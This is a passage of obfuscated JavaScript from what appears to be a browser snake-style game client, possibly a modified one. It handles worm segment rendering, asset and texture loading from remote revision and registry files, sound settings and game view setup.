            this.Nc.xc.alpha = _0x503ed4.Q(this.Nc.xc.alpha, _0xdeee03.Xc ? 0.9 : 0.2, _0x1524c9, 0.0025);
            this.Nc.Tc(_0x571b6a);
          };
          _0x1e37ae.prototype.Oc = function () {
            this.Nc.xc.visible = false;
          };
          return _0x1e37ae;
        }();
        _0x3c26e1.prototype.Yc = function (_0x5827ba) {
          var _0x449c30 = Math.PI * 0.1;
          return this.uc + this.vc * Math.sin(_0x5827ba * _0x449c30 - this.tc);
        };
        _0x3c26e1.prototype.Zc = function (_0x3cf484, _0x3b4a54, _0x43c961, _0x31cddf) {
          var _0x315076 = _0x3cf484.$c * 2;
          var _0x31435a = _0x3cf484._c;
          var _0x3c9b16 = _0x3cf484.ad;
          var _0xb4699d = _0x3c9b16 * 4 - 3;
          var _0x597435 = _0xb4699d;
          this.tc = _0x3b4a54 / 400 * Math.PI;
          this.uc = _0x315076 * 1.5;
          this.vc = _0x315076 * 0.15 * _0x3cf484.bd;
          var _0x58bd80;
          var _0x44be2d;
          var _0x559cee;
          var _0x2c2e71;
          var _0x3eaa77;
          var _0x2d226c;
          var _0x1f5eb9;
          var _0x370354;
          _0x44be2d = _0x31435a[0];
          _0x2d226c = _0x31435a[1];
          if (_0x31cddf(_0x44be2d, _0x2d226c)) {
            _0x559cee = _0x31435a[2];
            _0x1f5eb9 = _0x31435a[3];
            _0x2c2e71 = _0x31435a[4];
            _0x370354 = _0x31435a[5];
            var _0xd007b0 = Math.atan2(_0x370354 + _0x2d226c * 2 - _0x1f5eb9 * 3, _0x2c2e71 + _0x44be2d * 2 - _0x559cee * 3);
            this.oc.Sc(_0x44be2d, _0x2d226c, _0x315076, _0xd007b0);
            this.qc[0].Sc(_0x44be2d, _0x2d226c, _0x315076, this.Yc(0), _0xd007b0);
            this.qc[1].Sc(_0x22e5a9 * _0x44be2d + _0xffde87 * _0x559cee + _0x33bf66 * _0x2c2e71, _0x22e5a9 * _0x2d226c + _0xffde87 * _0x1f5eb9 + _0x33bf66 * _0x370354, _0x315076, this.Yc(1), _0x25d4d2.cd(this.qc[0], this.qc[2]));
            this.qc[2].Sc(_0x12dc3a * _0x44be2d + _0xe52042 * _0x559cee + _0xccca93 * _0x2c2e71, _0x12dc3a * _0x2d226c + _0xe52042 * _0x1f5eb9 + _0xccca93 * _0x370354, _0x315076, this.Yc(2), _0x25d4d2.cd(this.qc[1], this.qc[3]));
            this.qc[3].Sc(_0x9b7e4d * _0x44be2d + _0x2a3627 * _0x559cee + _0x4ec270 * _0x2c2e71, _0x9b7e4d * _0x2d226c + _0x2a3627 * _0x1f5eb9 + _0x4ec270 * _0x370354, _0x315076, this.Yc(3), _0x25d4d2.cd(this.qc[2], this.qc[4]));
          } else {
            this.oc.Uc();
            this.qc[0].Uc();
            this.qc[1].Uc();
            this.qc[2].Uc();
            this.qc[3].Uc();
          }
          var _0x2f54ae = 4;
          var _0x332661 = 2;
          var _0x1fc699 = _0x3c9b16 * 2 - 4;
          while (_0x332661 < _0x1fc699) {
            _0x44be2d = _0x31435a[_0x332661];
            _0x2d226c = _0x31435a[_0x332661 + 1];
            if (_0x31cddf(_0x44be2d, _0x2d226c)) {
              _0x58bd80 = _0x31435a[_0x332661 - 2];
              _0x3eaa77 = _0x31435a[_0x332661 - 1];
              _0x559cee = _0x31435a[_0x332661 + 2];
              _0x1f5eb9 = _0x31435a[_0x332661 + 3];
              _0x2c2e71 = _0x31435a[_0x332661 + 4];
              _0x370354 = _0x31435a[_0x332661 + 5];
              this.qc[_0x2f54ae].Sc(_0x44be2d, _0x2d226c, _0x315076, this.Yc(_0x2f54ae), _0x25d4d2.cd(this.qc[_0x2f54ae - 1], this.qc[_0x2f54ae + 1]));
              _0x2f54ae++;
              this.qc[_0x2f54ae].Sc(_0x164383 * _0x58bd80 + _0x5c2088 * _0x44be2d + _0x519c3a * _0x559cee + _0x4f7399 * _0x2c2e71, _0x164383 * _0x3eaa77 + _0x5c2088 * _0x2d226c + _0x519c3a * _0x1f5eb9 + _0x4f7399 * _0x370354, _0x315076, this.Yc(_0x2f54ae), _0x25d4d2.cd(this.qc[_0x2f54ae - 1], this.qc[_0x2f54ae + 1]));
              _0x2f54ae++;
              this.qc[_0x2f54ae].Sc(_0x2fe320 * _0x58bd80 + _0x17a1dc * _0x44be2d + _0x17a1dc * _0x559cee + _0x2fe320 * _0x2c2e71, _0x2fe320 * _0x3eaa77 + _0x17a1dc * _0x2d226c + _0x17a1dc * _0x1f5eb9 + _0x2fe320 * _0x370354, _0x315076, this.Yc(_0x2f54ae), _0x25d4d2.cd(this.qc[_0x2f54ae - 1], this.qc[_0x2f54ae + 1]));
              _0x2f54ae++;
              this.qc[_0x2f54ae].Sc(_0x4f7399 * _0x58bd80 + _0x519c3a * _0x44be2d + _0x5c2088 * _0x559cee + _0x164383 * _0x2c2e71, _0x4f7399 * _0x3eaa77 + _0x519c3a * _0x2d226c + _0x5c2088 * _0x1f5eb9 + _0x164383 * _0x370354, _0x315076, this.Yc(_0x2f54ae), _0x25d4d2.cd(this.qc[_0x2f54ae - 1], this.qc[_0x2f54ae + 1]));
              _0x2f54ae++;
            } else {
              this.qc[_0x2f54ae].Uc();
              _0x2f54ae++;
              this.qc[_0x2f54ae].Uc();
              _0x2f54ae++;
              this.qc[_0x2f54ae].Uc();
              _0x2f54ae++;
              this.qc[_0x2f54ae].Uc();
              _0x2f54ae++;
            }
            _0x332661 += 2;
          }
          _0x44be2d = _0x31435a[_0x3c9b16 * 2 - 4];
          _0x2d226c = _0x31435a[_0x3c9b16 * 2 - 3];
          if (_0x31cddf(_0x44be2d, _0x2d226c)) {
            _0x58bd80 = _0x31435a[_0x3c9b16 * 2 - 6];
            _0x3eaa77 = _0x31435a[_0x3c9b16 * 2 - 5];
            _0x559cee = _0x31435a[_0x3c9b16 * 2 - 2];
            _0x1f5eb9 = _0x31435a[_0x3c9b16 * 2 - 1];
            this.qc[_0xb4699d - 5].Sc(_0x44be2d, _0x2d226c, _0x315076, this.Yc(_0xb4699d - 5), _0x25d4d2.cd(this.qc[_0xb4699d - 6], this.qc[_0xb4699d - 4]));
            this.qc[_0xb4699d - 4].Sc(_0x4ec270 * _0x58bd80 + _0x2a3627 * _0x44be2d + _0x9b7e4d * _0x559cee, _0x4ec270 * _0x3eaa77 + _0x2a3627 * _0x2d226c + _0x9b7e4d * _0x1f5eb9, _0x315076, this.Yc(_0xb4699d - 4), _0x25d4d2.cd(this.qc[_0xb4699d - 5], this.qc[_0xb4699d - 3]));
            this.qc[_0xb4699d - 3].Sc(_0xccca93 * _0x58bd80 + _0xe52042 * _0x44be2d + _0x12dc3a * _0x559cee, _0xccca93 * _0x3eaa77 + _0xe52042 * _0x2d226c + _0x12dc3a * _0x1f5eb9, _0x315076, this.Yc(_0xb4699d - 3), _0x25d4d2.cd(this.qc[_0xb4699d - 4], this.qc[_0xb4699d - 2]));
            this.qc[_0xb4699d - 2].Sc(_0x33bf66 * _0x58bd80 + _0xffde87 * _0x44be2d + _0x22e5a9 * _0x559cee, _0x33bf66 * _0x3eaa77 + _0xffde87 * _0x2d226c + _0x22e5a9 * _0x1f5eb9, _0x315076, this.Yc(_0xb4699d - 2), _0x25d4d2.cd(this.qc[_0xb4699d - 3], this.qc[_0xb4699d - 1]));
            this.qc[_0xb4699d - 1].Sc(_0x559cee, _0x1f5eb9, _0x315076, this.Yc(_0xb4699d - 1), _0x25d4d2.cd(this.qc[_0xb4699d - 2], this.qc[_0xb4699d - 1]));
          } else {
            this.qc[_0xb4699d - 5].Uc();
            this.qc[_0xb4699d - 4].Uc();
            this.qc[_0xb4699d - 3].Uc();
            this.qc[_0xb4699d - 2].Uc();
            this.qc[_0xb4699d - 1].Uc();
          }
          if (this.pc === 0 && _0x597435 > 0) {
            this.nc.addChild(this.oc);
          }
          if (this.pc > 0 && _0x597435 === 0) {
            _0x503ed4.U(this.oc);
          }
          while (this.pc < _0x597435) {
            this.nc.addChild(this.qc[this.pc].Cc.Qc());
            this.nc.addChild(this.qc[this.pc].Dc.Qc());
            this.pc += 1;
          }
          while (this.pc > _0x597435) {
            this.pc -= 1;
            this.qc[this.pc].Dc.Rc();
            this.qc[this.pc].Cc.Rc();
          }
          var _0xfe65c7 = _0x3cf484.dd[_0x1c97c7.fd.ed];
          if (this.qc[0].gd() && _0xfe65c7 && _0xfe65c7.hd) {
            this.oc.Vc(_0x3cf484, _0x315076, _0x3b4a54, _0x43c961);
          } else {
            this.oc.Mc();
          }
          var _0x48938f = _0x3cf484.dd[_0x1c97c7.fd.jd];
          if (this.qc[0].gd() && _0x48938f && _0x48938f.hd) {
            this.oc.Wc(_0x3cf484, _0x315076, _0x3b4a54, _0x43c961);
          } else {
            this.oc.Oc();
          }
          var _0x442bb8 = _0x3cf484.dd[_0x1c97c7.fd.pd];
          if (this.qc[0].gd() && _0x442bb8 != null && _0x442bb8.hd) {
            this.oc.activeFlex(_0x3cf484, _0x315076, _0x3b4a54, _0x43c961);
          } else {
            this.oc.disableFlex();
          }
          movimentaLinha();
        };
        var _0x25d4d2 = function () {
          function _0x56c815(_0x39c5a1, _0x27c991) {
            this.Cc = _0x39c5a1;
            this.Cc.kd(false);
            this.Dc = _0x27c991;
            this.Dc.kd(false);
            this.ev = null;
          }
          _0x56c815.prototype.Sc = function (_0x76be18, _0x50e669, _0x8abaea, _0x4a6531, _0x22a815) {
            this.Cc.kd(true);
            this.Cc.ld(_0x76be18, _0x50e669);
            this.Cc.Tc(_0x8abaea);
            this.Cc.md(_0x22a815);
            this.Dc.kd(true);
            this.Dc.ld(_0x76be18, _0x50e669);
            this.Dc.Tc(_0x4a6531);
            this.Dc.md(_0x22a815);
          };
          _0x56c815.prototype.Uc = function () {
            this.Cc.kd(false);
            this.Dc.kd(false);
          };
          _0x56c815.prototype.gd = function () {
            return this.Cc.gd();
          };
          _0x56c815.cd = function (_0x5e483a, _0x3b8d34) {
            return Math.atan2(_0x5e483a.Cc.xc.position.y - _0x3b8d34.Cc.xc.position.y, _0x5e483a.Cc.xc.position.x - _0x3b8d34.Cc.xc.position.x);
          };
          return _0x56c815;
        }();
        return _0x3c26e1;
      }();
      _0x1c97c7.fd = function () {
        function _0x355368(_0x8cdcbc) {
          this.nd = _0x8cdcbc;
          this.hd = false;
          this.od = 1;
        }
        _0x355368.jd = 0;
        _0x355368.pd = 1;
        _0x355368.ed = 2;
        _0x355368.qd = 6;
        _0x355368.rd = 3;
        _0x355368.sd = 4;
        _0x355368.td = 5;
        return _0x355368;
      }();
      _0x1c97c7.Ab = function (_0x4d136f) {
        var _0x4dede5 = function () {
          function _0x5d0550(_0x58d211, _0x3897ae) {
            _0x1965c9(this, _0x5d0550);
            this.ud = _0x58d211;
            this.vd = _0x3897ae;
          }
          return _0x16d9e2(_0x5d0550, [{
            key: "Jb",
            value: function _0x5af455() {
              return this.ud.revision;
            }
          }, {
            key: "Yb",
            value: function _0x16d708() {
              _0x498743.Jb();
              return this.ud;
            }
          }, {
            key: "Ub",
            value: function _0x399f03() {
              return this.vd;
            }
          }]);
        }();
        _0x4d136f = _0x4dede5;
        _0x13f8f6(_0x4dede5, "wd", new _0x4d136f({}, _0x1c97c7.Ga.Ca()));
        return _0x4dede5;
      }();
      _0x1c97c7.Mb = function () {
        function _0x1eb7bd(_0x3a4763) {
          this.xd = function () {
            ++_0x1eb7bd.yd;
            return function (_0x3b038e, _0x35e885) {};
          }();
          this.zd = _0x3a4763;
          this.Ad = null;
          this.Bd = null;
          this.Cd = null;
          this.Dd = null;
          this.Ed = null;
          this.Fd = false;
          this.Gd = false;
          this.Hd = false;
        }
        _0x1eb7bd.Id = {
          Jd: "0x0",
          Kd: "0x1",
          Ld: "0x2",
          Md: "0x3",
          Nd: "0x4"
        };
        _0x1eb7bd.yd = 100000;
        _0x1eb7bd.Od = new _0x1c97c7._b.cc().ec(_0x1eb7bd.Id.Jd, 1).ec(_0x1eb7bd.Id.Kd, 10).ec(_0x1eb7bd.Id.Ld, 50).ec(_0x1eb7bd.Id.Md, 15).ec(_0x1eb7bd.Id.Nd, 5).hc();
        _0x1eb7bd.prototype.Rb = function (_0x33edc7) {
          this.Ad = _0x33edc7;
        };
        _0x1eb7bd.prototype.Qb = function (_0x5182a6) {
          this.Bd = _0x5182a6;
        };
        _0x1eb7bd.prototype.Ob = function (_0x21aa62) {
          this.Cd = _0x21aa62;
        };
        _0x1eb7bd.prototype.Pb = function (_0xb2dabc) {
          this.Dd = _0xb2dabc;
        };
        _0x1eb7bd.prototype.Nb = function (_0x51ac2f) {
          this.Ed = _0x51ac2f;
        };
        _0x1eb7bd.prototype.Kb = function () {
          return this.Hd;
        };
        _0x1eb7bd.prototype.Lb = function () {
          this.Fd = true;
        };
        _0x1eb7bd.prototype.Vb = function () {
          if (!this.Gd) {
            this.Gd = true;
            if (this.Fd) {
              this.Pd();
              return;
            }
            this.Qd();
          }
        };
        _0x1eb7bd.prototype.Qd = function () {
          function _0x1ced64(_0x1f8951) {
            var _0x371b10 = _0x1eb7bd.Id.Jd;
            _0x1d66eb.Rd(_0x371b10, _0x1eb7bd.Od.bc(_0x371b10).lc(_0x1f8951));
          }
          var _0x1d66eb = this;
          if (this.Fd) {
            this.Pd();
            return;
          }
          $.ajax({
            type: "GET",
            url: _0x503ed4.a.c + "/dynamic/assets/revision.json",
            xhrFields: {
              onprogress: function _0x2b59ad(_0x557f4f) {
                if (_0x557f4f.lengthComputable) {
                  _0x1ced64(_0x557f4f.loaded / _0x557f4f.total);
                }
              }
            }
          }).fail(function () {
            _0x1d66eb.Sd(new Error());
          }).done(function (_0xb4e75d) {
            if (_0xb4e75d <= _0x1d66eb.zd) {
              _0x1d66eb.Td();
              return;
            }
            _0x1d66eb.Ud();
          });
        };
        _0x1eb7bd.prototype.Ud = _0x8f1d97(_0x22e5a4().mark(function _0xc1eeeb() {
          var _0x10f1e2;
          var _0x3c5b5b;
          var _0x4cc388;
          return _0x22e5a4().wrap(function _0x4e0f96(_0xc93219) {
            while (1) {
              switch (_0xc93219.prev = _0xc93219.next) {
                case 0:
                  _0x10f1e2 = function _0x26cd15(_0x4efe51) {
                    var _0x450be9 = _0x1eb7bd.Id.Kd;
                    _0x3c5b5b.Rd(_0x450be9, _0x1eb7bd.Od.bc(_0x450be9).lc(_0x4efe51));
                  };
                  _0x3c5b5b = this;
                  if (!this.Fd) {
                    _0xc93219.next = 4;
                    break;
                  }
                  return _0xc93219.abrupt("return", void this.Pd());
                case 4:
                  _0xc93219.next = 6;
                  return fetch(window.vps.s_l + "/version");
                case 6:
                  _0x4cc388 = _0xc93219.sent;
                  _0xc93219.next = 9;
                  return _0x4cc388.json();
                case 9:
                  _0x4cc388 = _0xc93219.sent;
                  localStorage.setItem("wup_version", _0x4cc388);
                  if (_0x18eb70 != _0x4cc388) {
                    $.ajax({
                      type: "GET",
                      url: _0x503ed4.a.c + "/dynamic/assets/registry.json",
                      xhrFields: {
                        onprogress: function _0x2a6275(_0x1f5da1) {
                          if (_0x1f5da1.lengthComputable) {
                            _0x10f1e2(_0x1f5da1.loaded / _0x1f5da1.total);
                          }
                        }
                      }
                    }).fail(function () {
                      _0x3c5b5b.Sd(new Error());
                    }).done(function () {
                      var _0x51bac3 = _0x8f1d97(_0x22e5a4().mark(function _0xe11f3d(_0x5bba26) {
                        return _0x22e5a4().wrap(function _0xe23a2e(_0x51f1bc) {
                          while (1) {
                            switch (_0x51f1bc.prev = _0x51f1bc.next) {
                              case 0:
                                _0x51f1bc.next = 2;
                                return _0x498743.registry(_0x5bba26);
                              case 2:
                                _0x5bba26 = _0x51f1bc.sent;
                                localStorage.setItem("wup_config", JSON.stringify(_0x5bba26));
                                _0x3c5b5b.Vd(_0x5bba26, _0x1eb7bd);
                              case 5:
                              case "end":
                                return _0x51f1bc.stop();
                            }
                          }
                        }, _0xe11f3d);
                      }));
                      return function (_0x3c02d0) {
                        return _0x51bac3.apply(this, arguments);
                      };
                    }());
                  } else {
                    try {
                      _0x1972ff = JSON.parse(_0x1972ff);
                      _0x10f1e2(1);
                      _0x3c5b5b.Vd(_0x1972ff, _0x1eb7bd);
                    } catch (_0x175216) {
                      localStorage.removeItem("wup_version");
                      localStorage.removeItem("wup_config");
                    }
                  }
                case 12:
                case "end":
                  return _0xc93219.stop();
              }
            }
          }, _0xc1eeeb, this);
        }));
        _0x1eb7bd.prototype.Vd = _0x498743.Vd || function (_0x59dbd6) {
          function _0x393c2e(_0x5c9b22) {
            var _0x4325e6 = _0x1eb7bd.Id.Ld;
            _0x259178.Rd(_0x4325e6, _0x1eb7bd.Od.bc(_0x4325e6).lc(_0x5c9b22));
          }
          var _0x259178 = this;
          if (this.Fd) {
            this.Pd();
            return;
          }
          var _0x144d1b = [];
          var _0x5cb84c = [];
          var _0x21ea7c = 0;
          for (var _0xd67043 in _0x59dbd6.textureDict) {
            if (_0x59dbd6.textureDict.hasOwnProperty(_0xd67043)) {
              var _0x2b9588 = _0x59dbd6.textureDict[_0xd67043];
              var _0x106cb6 = _0x503ed4.a.c + _0x2b9588.relativePath;
              var _0x21c040 = _0x2b9588.fileSize;
              var _0x18cc2f = _0x2b9588.sha256;
              var _0x43fc65 = new _0x1eb7bd.Wd(_0xd67043, _0x106cb6, _0x21c040, _0x18cc2f);
              _0x144d1b.push(_0x43fc65);
              _0x5cb84c.push(_0x43fc65);
              _0x21ea7c += _0x21c040;
            }
          }
          var _0x146095;
          var _0x44c5a5 = 0;
          var _0x3d30b7 = function _0x1e32ab(_0x25b84d) {
            for (var _0xf4a115 = 0; _0xf4a115 < _0x5cb84c.length; _0xf4a115++) {
              try {
                window.URL.revokeObjectURL(_0x5cb84c[_0xf4a115].Xd);
              } catch (_0x11fbdd) {}
            }
            _0x259178.Sd(_0x25b84d);
          };
          var _0x236c87 = function _0x34d0ad(_0x53565d) {
            var _0x503eaf = Math.floor(_0x146095.Yd * _0x53565d);
            _0x393c2e((_0x44c5a5 + _0x503eaf) / _0x21ea7c);
          };
          var _0x2f4b86 = function _0x2649b2(_0x15d785) {
            var _0x1cff66 = new Blob([_0x15d785]);
            _0x146095.Xd = window.URL.createObjectURL(_0x1cff66);
            _0x44c5a5 += _0x146095.Yd;
            _0x1fcbdb();
          };
          var _0x1fcbdb = function _0x39b697() {
            if (_0x166b25 < _0x5cb84c.length) {
              _0x146095 = _0x5cb84c[_0x166b25++];
              _0x259178.Zd(_0x146095, _0x3d30b7, _0x2f4b86, _0x236c87);
              return;
            }
            setTimeout(function () {
              return _0x259178.$d(_0x59dbd6, _0x144d1b);
            }, 0);
          };
          var _0x166b25 = 0;
          _0x1fcbdb();
        };
        _0x1eb7bd.prototype.Zd = _0x498743.Zd || function (_0x3389a8, _0x1851f3, _0x52f319, _0x57bd1b) {
          $.ajax({
            type: "GET",
            url: _0x3389a8._d,
            xhrFields: {
              responseType: "arraybuffer",
              onprogress: function _0x550337(_0x8077f2) {
                if (_0x8077f2.lengthComputable) {
                  _0x57bd1b(_0x8077f2.loaded / _0x8077f2.total);
                }
              }
            }
          }).fail(function () {
            _0x1851f3(new Error());
          }).done(function (_0x4e3440) {
            _0x52f319(_0x4e3440);
          });
        };
        _0x1eb7bd.prototype.$d = _0x498743.$d || function (_0x347269, _0x1b7404) {
          function _0x2f3c49(_0x7bd539) {
            var _0x54859d = _0x1eb7bd.Id.Md;
            _0x3226d3.Rd(_0x54859d, _0x1eb7bd.Od.bc(_0x54859d).lc(_0x7bd539));
          }
          var _0x3226d3 = this;
          if (this.Fd) {
            this.Pd();
            return;
          }
          var _0x28ccc2;
          var _0x26c959;
          var _0x406fa7 = {};
          var _0x44bff7 = function _0x4cc891() {
            for (var _0x2e372c = 0; _0x2e372c < _0x1b7404.length; _0x2e372c++) {
              try {
                window.URL.revokeObjectURL(_0x1b7404[_0x2e372c].Xd);
              } catch (_0x57a373) {}
            }
            _0x3226d3.Sd(new Error());
          };
          var _0x4168d1 = function _0x5e1e41() {
            _0x2f3c49(_0x2866f8 / _0x1b7404.length);
            _0x406fa7[_0x28ccc2.ae] = new _0x1c97c7.be(_0x28ccc2.Xd, _0x26c959);
            _0x112ff4();
          };
          var _0x112ff4 = function _0x528299() {
            if (_0x2866f8 < _0x1b7404.length) {
              _0x28ccc2 = _0x1b7404[_0x2866f8++];
              _0x26c959 = PIXI.BaseTexture.from(_0x28ccc2.Xd);
              _0x26c959.on("error", _0x44bff7);
              _0x26c959.on("loaded", _0x4168d1);
              return;
            }
            setTimeout(function () {
              return _0x3226d3.ce(_0x347269, _0x406fa7);
            }, 0);
          };
          var _0x2866f8 = 0;
          _0x112ff4();
        };
        _0x1eb7bd.prototype.ce = function (_0x2e007e, _0xec009b) {
          function _0x416a0d(_0x3156bd) {
            var _0x397a4b = _0x1eb7bd.Id.Nd;
            _0x306f3f.Rd(_0x397a4b, _0x1eb7bd.Od.bc(_0x397a4b).lc(_0x3156bd));
          }
          var _0x306f3f = this;
          var _0x50ea73 = {};
          var _0x483c01 = 0;
          var _0x495275 = Object.values(_0x2e007e.regionDict).length;
          _0x503ed4._(_0x2e007e.regionDict, function (_0x3eb1c6, _0x115af7) {
            var _0x5042a6 = null;
            try {
              var _0x39e2a1 = null;
              if (_0xec009b[_0x115af7.texture].ev) {
                _0x39e2a1 = _0xec009b[_0x115af7.texture].ev;
              }
              var _0x5e0776 = _0x115af7.texture + ":" + _0x3eb1c6;
              _0x5042a6 = _0x1c97c7.la.Da(_0x5e0776, _0xec009b[_0x115af7.texture].oa, _0x115af7, _0x39e2a1);
              _0x50ea73[_0x3eb1c6] = _0x5042a6;
              if (++_0x483c01 % 10 == 0) {
                _0x416a0d(_0x483c01 / _0x495275);
              }
            } catch (_0x20d56a) {}
          });
          var _0x3b975c = Object.values(_0xec009b).map(function (_0x17f523) {
            return _0x17f523.oa;
          });
          var _0x28ef9d = Object.values(_0x50ea73);
          var _0x57a224 = new _0x1c97c7.Ab(_0x2e007e, _0x1c97c7.Ga.fb(_0x2e007e, _0x50ea73, _0x3b975c, _0x28ef9d));
          setTimeout(function () {
            return _0x306f3f.de(_0x57a224);
          }, 0);
        };
        _0x1eb7bd.Wd = function () {
          function _0x5148db(_0x205a5c, _0x4ec117, _0x5b326b, _0x3c7cd8) {
            this.ae = _0x205a5c;
            this._d = _0x4ec117;
            this.Yd = _0x5b326b;
            this.ee = _0x3c7cd8;
            this.Xd = "";
          }
          return _0x5148db;
        }();
        _0x1eb7bd.prototype.de = function (_0x544f84) {
          if (this.Hd) {
            _0x544f84.Ub().Fa();
            return;
          }
          this.Hd = true;
          var _0x47b3ed = this;
          setTimeout(function () {
            return _0x47b3ed.Ad(_0x544f84);
          }, 0);
        };
        _0x1eb7bd.prototype.Td = function () {
          if (!this.Hd) {
            this.Hd = true;
            var _0x392326 = this;
            setTimeout(function () {
              return _0x392326.Bd();
            }, 0);
          }
        };
        _0x1eb7bd.prototype.Sd = function (_0x1a15c0) {
          if (!this.Hd) {
            this.Hd = true;
            var _0x15314e = this;
            setTimeout(function () {
              return _0x15314e.Cd(_0x1a15c0);
            }, 0);
          }
        };
        _0x1eb7bd.prototype.Pd = function () {
          if (!this.Hd) {
            this.Hd = true;
            var _0x1e6df6 = this;
            setTimeout(function () {
              return _0x1e6df6.Dd();
            }, 0);
          }
        };
        _0x1eb7bd.prototype.Rd = function (_0x307c87, _0x203538) {
          if (!this.Hd && !this.Fd) {
            var _0x1b9f1b = this;
            return _0x1b9f1b.Ed(_0x307c87, _0x203538);
          }
        };
        return _0x1eb7bd;
      }();
      _0x1c97c7.fe = function () {
        return {};
      }();
      _0x1c97c7.ge = function () {
        function _0x4d9da5() {
          this.he = _0x1c97c7.ge.je.ie;
          this.ke = false;
          this.le = false;
          this.me = null;
          this.ne = null;
        }
        _0x4d9da5.prototype.ha = function () {};
        _0x4d9da5.prototype.oe = function (_0x4aab4a) {
          this.le = _0x4aab4a;
        };
        _0x4d9da5.prototype.pe = function (_0x5afaa0) {
          this.he = _0x5afaa0;
          this.qe();
        };
        _0x4d9da5.prototype.re = function (_0x399070) {
          this.ke = _0x399070;
          this.qe();
        };
        _0x4d9da5.prototype.qe = function () {};
        _0x4d9da5.prototype.se = function (_0x4fc814, _0x122579) {
          if (!_0xf1d21a().Lc.Wb()) {
            return null;
          }
          var _0x1108fa = _0x4fc814[_0x122579];
          if (_0x1108fa == null || _0x1108fa.length === 0) {
            return null;
          } else {
            return _0x1108fa[Math.floor(Math.random() * _0x1108fa.length)].cloneNode();
          }
        };
        _0x4d9da5.prototype.te = function (_0x2ae448, _0x3acd0e, _0x4c0b3a) {
          if (this.le && !(_0x4c0b3a <= 0)) {
            var _0x58f9e4 = this.se(_0x2ae448, _0x3acd0e);
            if (_0x58f9e4 != null) {
              _0x58f9e4.volume = Math.min(1, _0x4c0b3a);
              _0x58f9e4.play();
            }
          }
        };
        _0x4d9da5.prototype.ue = function (_0x228e3c, _0xc2ed47) {
          if (this.he.ve) {
            this.te(_0x1c97c7.xe.we, _0x228e3c, _0xc2ed47);
          }
        };
        _0x4d9da5.prototype.ye = function (_0xa623b8, _0x30abd2) {
          if (this.he.ze) {
            this.te(_0x1c97c7.xe.Ae, _0xa623b8, _0x30abd2);
          }
        };
        _0x4d9da5.prototype.Be = function () {};
        _0x4d9da5.prototype.Ce = function () {};
        _0x4d9da5.prototype.De = function () {};
        _0x4d9da5.prototype.Ee = function () {};
        _0x4d9da5.prototype.Fe = function () {};
        _0x4d9da5.prototype.Ge = function () {};
        _0x4d9da5.prototype.He = function (_0x21a546, _0x2cee42, _0x3d30fd) {};
        _0x4d9da5.prototype.Ie = function (_0x5be126) {};
        _0x4d9da5.prototype.Je = function (_0xf8238b) {};
        _0x4d9da5.prototype.Ke = function (_0x22608c) {};
        _0x4d9da5.prototype.Le = function (_0x39903d) {};
        _0x4d9da5.prototype.Me = function (_0x3fe8a7) {};
        _0x4d9da5.prototype.Ne = function (_0xf39a93) {};
        _0x4d9da5.prototype.Oe = function (_0x42c3c8) {};
        _0x4d9da5.prototype.Pe = function (_0x249d1d) {};
        _0x4d9da5.prototype.Qe = function (_0x4d1c1c) {};
        _0x4d9da5.prototype.Re = function (_0x45c4df) {};
        _0x4d9da5.prototype.Se = function (_0x50a2c8) {};
        _0x4d9da5.prototype.Te = function (_0x130b57) {};
        _0x4d9da5.prototype.Ue = function (_0x1a452a) {};
        _0x4d9da5.prototype.Ve = function (_0x2d451f) {};
        _0x4d9da5.prototype.We = function (_0x6748f9, _0x4971f8) {};
        _0x4d9da5.prototype.Xe = function (_0x803c14) {};
        _0x4d9da5.prototype.Ye = function (_0x125e58, _0x40fe07, _0x5dd6d1) {};
        _0x4d9da5.je = {
          ie: {
            Ze: false,
            $e: false,
            ze: true,
            ve: false
          },
          _e: {
            Ze: false,
            $e: true,
            ze: true,
            ve: false
          },
          af: {
            Ze: true,
            $e: false,
            ze: false,
            ve: true
          },
          bf: {
            Ze: false,
            $e: false,
            ze: true,
            ve: false
          },
          cf: {
            Ze: false,
            $e: false,
            ze: false,
            ve: false
          }
        };
        return _0x4d9da5;
      }();
      _0x1c97c7.GameView = function () {
        function _0x1d246d(_0x230cc9) {
          var _0x4195dc = _0xf1d21a();
          this.ef = _0x230cc9;
          this.Eb = _0x230cc9.get()[0];
          this.ff = 1;
          this.gf = 1;
          this.hf = null;
          this.lf = new _0x32defb.Renderer({
            view: _0x230cc9.get()[0],
            backgroundColor: 0,
            transparent: false,
            antialias: false,
            autoResize: true
          });
          this.mf = new _0x32defb.Container();
          this.mf.sortableChildren = true;
          this.nf = new _0x32defb.Container();
          this.nf.zIndex = 0;
          this.mf.addChild(this.nf);
          this.uf = new _0x32defb.Container();
          this.uf.zIndex = 3;
          this.mf.addChild(this.uf);
          this.vf = [];
          this.wf = [];
          this.xf = [];
          this.ha();
        }
        var _0x8a42e = 0;
        var _0x1a7908 = 5;
        var _0x2b377b = [{
          yf: 1,
          zf: 0.15,
          Af: 0
        }, {
          yf: 1,
          zf: 0.125,
          Af: 0
        }, {
          yf: 1,
          zf: 0.1,
          Af: 0
        }, {
          yf: 1,
          zf: 0.075,
          Af: 0
        }, {
          yf: 1,
          zf: 0.05,
          Af: 0
        }, {
          yf: 1,
          zf: 0.025,
          Af: 0
        }, {
          yf: 1,
          zf: 0,
          Af: 0.025
        }, {
          yf: 1,
          zf: 0,
          Af: 0.05
        }, {
          yf: 1,
          zf: 0,
          Af: 0.075
        }, {
          yf: 1,
          zf: 0,
          Af: 0.1
        }, {
          yf: 1,
          zf: 0,
          Af: 0.125
        }, {
          yf: 1,
          zf: 0,
          Af: 0.15
        }];
        _0x1d246d.prototype.ha = function () {
          var _0x2c2faa = _0xf1d21a();
          this.lf.backgroundColor = _0x8a42e;
          this.vf = new Array(_0x2b377b.length);
          for (var _0x3abad9 = 0; _0x3abad9 < this.vf.length; _0x3abad9++) {
            this.vf[_0x3abad9] = new _0x32defb.Sprite();
            this.vf[_0x3abad9].texture = _0x2c2faa.xe.Bf;
            this.vf[_0x3abad9].anchor.set(0.5);
            this.nf.addChild(this.vf[_0x3abad9]);
          }
          this.wf = new Array(_0x2c2faa.xe.Cf.length);
          for (var _0x20ea08 = 0; _0x20ea08 < this.wf.length; _0x20ea08++) {
            this.wf[_0x20ea08] = new _0x32defb.Sprite();
            this.wf[_0x20ea08].texture = _0x2c2faa.xe.Cf[_0x20ea08];
            this.wf[_0x20ea08].anchor.set(0.5);
            this.uf.addChild(this.wf[_0x20ea08]);
          }
          this.xf = new Array(this.wf.length);
          for (var _0x1c1ae4 = 0; _0x1c1ae4 < this.xf.length; _0x1c1ae4++) {
            var _0x571111 = [0.6, 1, 0.5];
            this.xf[_0x1c1ae4] = {
              Df: _0x503ed4.V(0, _0x1525ec.F),
